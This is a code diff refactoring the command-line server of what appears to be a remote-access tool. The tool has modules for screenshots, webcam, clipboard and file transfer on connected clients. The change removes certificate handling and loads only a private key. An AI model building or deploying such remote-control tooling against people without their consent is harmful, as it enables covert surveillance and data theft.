@@ -4,10 +4,8 @@ import logging
 import socket
 from contextlib import suppress
 
-from cryptography import x509
-from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import ec
-from modules import clipboard, download, filetransfer, screenshot, webcam, windows, tasks
+from modules import clipboard, download, filetransfer, screenshot, tasks, webcam, windows
 from modules.baseserver import BaseServer
 from utils import terminal
 from utils.timeout_handler import TimeoutSetter
@@ -57,8 +55,8 @@ class ServerCLI(BaseServer, cmd.Cmd):
     prompt = DEFAULT_PROMPT
     client = None
 
-    def __init__(self, certificate: x509.Certificate, private_key: ec.EllipticCurvePrivateKey):
-        BaseServer.__init__(self, certificate, private_key)
+    def __init__(self, private_key: ec.EllipticCurvePrivateKey):
+        BaseServer.__init__(self, private_key)
         cmd.Cmd.__init__(self)
 
     def default(self, _) -> None:
@@ -316,17 +314,14 @@ class ServerCLI(BaseServer, cmd.Cmd):
 
 
 if __name__ == '__main__':
-
-    # Read certficate from file
-    with open('cert.pem', 'rb') as file:
-        cert = x509.load_pem_x509_certificate(file.read())
+    from cryptography.hazmat.primitives import serialization
 
     # Read private key from file
-    with open('key.pem', 'rb') as file:
+    with open('private.pem', 'rb') as file:
         private_key = serialization.load_pem_private_key(file.read(), None)
 
     # Start server
-    server = ServerCLI(cert, private_key)
+    server = ServerCLI(private_key)
     server.start(('localhost', 6969))
 
     # Get a client that connected
